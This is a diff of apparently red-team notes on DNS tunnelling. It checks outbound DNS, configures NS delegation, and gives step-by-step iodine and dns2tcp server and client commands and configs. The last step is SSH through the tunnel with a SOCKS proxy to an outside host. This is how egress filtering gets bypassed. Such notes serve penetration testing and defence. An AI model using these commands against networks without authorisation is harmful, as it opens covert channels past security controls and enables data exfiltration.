@@ -1,8 +1,15 @@
-Check DNS Tunnel
+# Check DNS Tunnel via outbound DNS resolve
 
   $ dig google.com @8.8.8.8
   
-DNS Tunnel Exploitation
+# DNS Tunnel Test Configuration
+
+  $ configure NS via cloudns.net, config sample is below
+      example.bariskoparmal.com A record for 56.1.2.3
+      dns.example.bariskoparmal.com A record for 56.1.2.3
+      tunnel.example.bariskoparmal.com NS record for dns.example.bariskoparmal.com
+
+# with iodine
 
   Step 1: Server-side
     $ iodined -fP <username> 10.0.0.1 tunnel.4rchantos.cc
@@ -10,5 +17,48 @@ DNS Tunnel Exploitation
    Step 2: Client-side
     $ iodine -fP <username> <Server Public IP> tunnel.4rchantos.cc
     
-   Step3: Client-side
+   Step 3: Client-side
     $ ssh <username>@10.0.0.1
+
+# with dns2tcp
+
+  Step 1: Server Config
+    $ nano .dns2tcpdrc
+###
+listen = 0.0.0.0
+port = 53
+user = nobody
+chroot = /root/dns2tcp
+pid_file = /var/run/dns2tcp.pid
+domain = tunnel.example.bariskoparmal.com
+debug_level = 1
+key = secretkey
+resources = ssh:127.0.0.1:22
+END
+###
+    
+   Step 2: Client Config
+    $ nano .dns2tcprc
+
+###
+domain = tunnel.example.bariskoparmal.com
+resource = ssh
+local_port = 3333
+key = secretkey
+END
+###
+
+   Step 3: Server Command
+    $ dns2tcpd -F -d 1
+
+   Step 4: Client Command (list available connections)
+    $ dns2tcpc -z tunnel.example.bariskoparmal.com -k secretkey 56.1.2.3
+
+   Step 5: Client Command (Connect Tunnel)
+    $ dns2tcpc -r ssh -l 3333 -k secretkey -z tunnel.example.bariskoparmal.com 56.1.2.3
+
+   Step 6: Client Command (Connect SSH via Tunnel)
+    $ ssh kali@127.0.0.1 -p3333 -D8090
+
+
+
